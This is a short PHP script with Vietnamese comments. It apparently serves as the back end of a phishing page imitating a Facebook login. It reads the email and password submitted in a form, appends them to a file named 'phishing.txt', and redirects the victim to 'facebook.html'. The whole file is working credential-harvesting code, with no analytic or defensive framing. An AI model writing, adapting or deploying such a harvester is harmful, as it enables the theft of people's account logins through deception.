<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Lấy dữ liệu từ form
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Ghi vào tệp văn bản (hoặc lưu vào cơ sở dữ liệu)
    $file = fopen("phishing.txt", "a");
    fwrite($file, "Email: " . $email . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fclose($file);

    // In ra thông báo ghi thành công
    echo "Dữ liệu đã được ghi thành công!";

    // chuyển hướng đăng nhập 

}
header('Location: facebook.html');
exit;
?>